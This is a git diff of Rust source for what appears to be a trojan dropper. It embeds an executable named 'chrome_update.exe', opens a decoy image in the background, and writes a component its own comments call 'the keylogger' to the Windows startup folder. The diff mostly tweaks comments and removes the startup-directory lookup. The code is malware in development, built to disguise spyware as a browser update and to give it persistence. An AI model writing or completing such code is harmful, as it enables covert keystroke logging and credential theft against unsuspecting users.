@@ -13,11 +13,11 @@ const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
 const EXE_NAME: &'static str = "chrome_update.exe";
 
 fn main() {
+    // Part 2:  Write the image to the startup folder
     write_image_file();
-
     // Open the image with the default program
     match Command::new("cmd")
-        .args(&["/C", "start", "/B", IMAGE_FILE_OUT]) // add /B argument to start process in the background
+        .args(&["/C", "start", "/B", IMAGE_FILE_OUT]) // /B argument to start process in the background
         .spawn()// use spawn instead of status to not wait for the process to finish
     {
         Ok(_) => {
@@ -29,15 +29,6 @@ fn main() {
     };
 
     // Part 2:  Write the keylogger to the startup folder
-
-    let startup_dir = match get_startup_dir() {
-        Some(dir) => dir,
-        None => {
-            debug_print(format!("Failed to get the Startup directory"));
-            return;
-        }
-    };
-
     let exe_file_out_opt = write_app_file();
     match exe_file_out_opt {
         Some(exe_file_out) => {
